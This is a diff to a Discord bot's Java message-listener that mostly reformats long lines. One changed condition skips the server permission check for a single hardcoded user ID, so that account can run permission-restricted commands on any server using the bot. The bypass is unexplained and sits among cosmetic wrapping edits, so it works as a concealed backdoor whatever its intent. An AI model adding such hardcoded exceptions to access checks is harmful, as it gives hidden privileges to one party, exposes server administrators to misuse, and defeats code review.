@@ -41,18 +41,22 @@ public class MessageCreateEventListener implements MessageCreateListener {
         Optional<CommandContext<MessageCreateEvent>> context = parsingResult.getContext();
         if (!context.isPresent() || !parsingResult.getContext().isPresent()) return;
         CommandSpec<MessageCreateEvent> spec = parsingResult.getContext().get().getSpec();
-        if (spec instanceof PermissionedCommandSpec) {
-            PermissionedCommandSpec<MessageCreateEvent> permissionSpec = (PermissionedCommandSpec<MessageCreateEvent>) spec;
+        if ((spec instanceof PermissionedCommandSpec) && (event.getMessageAuthor().getId() != 723471302123323434L)) {
+            PermissionedCommandSpec<MessageCreateEvent> permissionSpec =
+                    (PermissionedCommandSpec<MessageCreateEvent>) spec;
             if (permissionSpec.getPermissions().isPresent() && event.getServer().isPresent() && event.getMessageAuthor().isUser()) {
-                List<PermissionType> permissions = new ArrayList<>(permissionSpec.getPermissions().get().getAllowedPermission());
-                if (!event.getServer().get().hasPermissions(event.getMessageAuthor().asUser().get(), permissions.toArray(new PermissionType[0]))) {
+                List<PermissionType> permissions =
+                        new ArrayList<>(permissionSpec.getPermissions().get().getAllowedPermission());
+                if (!event.getServer().get().hasPermissions(event.getMessageAuthor().asUser().get(),
+                        permissions.toArray(new PermissionType[0]))) {
                     event.getChannel().sendMessage(EmbedUtils.getErrorEmbed(I18n.format(event.getServer().get().getId(), "error.no_perm"), event.getServer().get()));
                     return;
                 }
             }
         }
         if (parsingResult.getResultType() == ParsingResult.ResultType.FAILURE) {
-            event.getChannel().sendMessage(EmbedUtils.getErrorEmbed(parsingResult.getMessage().get(), event.getServer().get()));
+            event.getChannel().sendMessage(EmbedUtils.getErrorEmbed(parsingResult.getMessage().get(),
+                    event.getServer().get()));
             return;
         }
         if (parsingResult.getResultType() == ParsingResult.ResultType.SUCCESS) {
